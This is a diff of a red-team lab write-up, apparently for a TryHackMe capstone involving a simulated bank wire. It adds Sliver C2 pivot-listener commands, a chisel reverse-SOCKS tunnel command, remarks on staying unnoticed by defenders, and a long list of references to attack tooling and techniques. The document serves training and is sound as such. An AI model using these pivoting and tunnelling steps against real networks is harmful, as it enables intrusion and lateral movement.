@@ -1653,15 +1653,23 @@ Part 3 of wiring money 101
 And Alice says yes to wiring 10 million dollars
 ![](YESALICEAPproVEtheWIRE.png)
 
-## EDIT FROM HERE
 
-## Beyond Rooting Everything
+## Beyond Root
 
-- Patch the way in theoretically to avoid ToU
-- Add a backdoor to custom source code theoretically to avoid ToU - swift backdoor
+I decided that due to time that I would simulate the beyond root RTCC on other machines and any remaining that were too specific like swift backdoor would be exotic language supply chain compromise. Overall all that I can add to what is research and theory that are then promises to myself to test out. 
 
-- Sliver Pivots VPN to JMP
-- Chisel from  VPN to JMP
+- Sliver Pivots VPN to JMP - firstly I thought I would actually need this and the main issue I ran into way lateral movement further in to drop beacons, which not S tier trade craft also I would have to go through and be on two DCs. Also custom VPN generated from the VPN machine to get all the way into compromise the swift banking application. I state there is no need to pivots other than learning sliver.  
+```go
+// VPN machine to Kali
+generate --tcp-pivot $tryhackmeVPNinterface:9990
+// ROOTDC to VPN
+generate --tcp-pivot 10.200.X.12:9991
+// BANKDC to ROOTDC
+generate --tcp-pivot 10.200.X.102:9992
+```
+- Key takeaways
+	- Lateral movement further in was my weakest area - to be excepted being that I have not had the experience to exploit domain trusts over multiple domains.
+	- That the above pivots are to deal with difficult to navigate segmentation are only really used sparingly as shadow network connects are weird to Blue.
 
 Pivots != Portfwd, engress through to implants
 ```go
@@ -1680,15 +1688,15 @@ pivots detail | pivot graph
 generate --tcp-pivot 192.168.1.1:9898
 ```
 
-```
-generate --tcp-pivot :9898
-```
+
 
 `portfwd` < `wg-portfwd`
 ```
 
 ```
 
+
+- Chisel from  VPN to JMP
 
 Preemptive Chisel organisation
 ``` bash
@@ -1701,15 +1709,13 @@ nohup ./chisel client 10.200.116.12:20002 R:127.0.0.1:20002:socks &
 
 ```
 
-
+The final email:
 ![](congrats.png)
 
-And Surpassing SuitGuy, which I remember from when I first started.
+And Surpassing SuitGuy, which I remember from when I first started - not to dunk on Suitguy, just to note how 50 top has been for the over the last year.
 ![](suppacingsuitguy.png)
 
-## References - dont add just read and script a references section
-
-READ FIRST
+## References
 
 https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/diamond-ticket
 https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/diamond
@@ -1720,7 +1726,48 @@ https://www.crowdstrike.com/blog/how-to-detect-and-prevent-impackets-wmiexec/
 https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden
 https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/sapphire
 https://dominicbreuker.com/post/learning_sliver_c2_10_sideload/
-https://dominicbreuker.com/post/learning_sliver_c2_09_execute_assembly/
+https://dominicbreuker.com/post/learning_sliver_c2_09_execute_assembly/https://learn.microsoft.com/en-us/powershell/module/activedirectory/set-adaccountpassword?view=windowsserver2022-ps
+https://www.youtube.com/@alh4zr3d3
+https://www.youtube.com/@Tib3rius
+https://github.com/tib3rius/AutoRecon
+https://www.youtube.com/@TylerRamsbey
+https://www.youtube.com/watch?v=xrh3g5VjY6Y&list=PLMoaZm9nyKaOrmj6SQH2b8lP6VN7Z4OD-
+https://0xb0b.gitbook.io/writeups/tryhackme/red-team-capstone-challenge/full-compromise-of-parent-domain
+https://en.wikipedia.org/wiki/Strategic_business_unit
+https://learn.microsoft.com/en-us/iis/application-frameworks/scenario-build-a-php-website-on-iis/configure-a-php-website-on-iis
+https://www.youtube.com/watch?v=xrh3g5VjY6Y&t=5277s
+https://github.com/optiv/ScareCrow
+https://github.com/Orange-Cyberdefense/ocd-mindmaps/blob/main/img/pentest_ad_dark_2023_02.svg
+https://www.twitch.tv/videos/1823317510
+https://www.youtube.com/watch?v=svdhIyifHC8
+https://gtfobins.github.io/gtfobins/cp/#sudo
+https://linux-kernel-labs.github.io/refs/heads/master/labs/networking.html
+https://github.com/iphelix/dnschef
+https://www.youtube.com/watch?v=izMMmOaLn9g
+https://github.com/GhostPack/Seatbelt
+https://hashcat.net/wiki/doku.php?id=example_hashes
+https://www.twitch.tv/videos/1829218217
+https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/netsh-advfirewall-firewall-control-firewall-behavior
+https://www.twitch.tv/videos/1829218217
+https://github.com/GhostPack/ForgeCert
+https://www.youtube.com/watch?v=xzxpn6k7OIQ
+https://www.youtube.com/watch?v=Td_Krk1S3yg
+https://www.twitch.tv/videos/1833475098
+https://learn.microsoft.com/en-us/azure/active-directory-domain-services/concepts-forest-trust
+https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/diamond-ticket
+https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/sapphire
+https://www.youtube.com/watch?v=ekep6_x0iQM&pp=ygUJeGN0IFd1dGFp
+https://github.com/thewover/donut
+https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/
+https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/attack-trusts
+https://www.twitch.tv/alh4zr3d
+https://0xb0b.gitbook.io/writeups/tryhackme/red-team-capstone-challenge
+https://www.youtube.com/watch?v=VctxgiEoDUU
+https://0xb0b.gitbook.io/writeups/tryhackme/red-team-capstone-challenge/full-compromise-of-parent-domain
+https://www.youtube.com/watch?v=i6LGJ7evrAg
+https://github.com/DonnchaC/shadowbrokers-exploits/tree/master/swift
+https://www.youtube.com/watch?v=xuUMlNx72xI
+https://www.twitch.tv/videos/1835142922
 
 ## Appendix
 
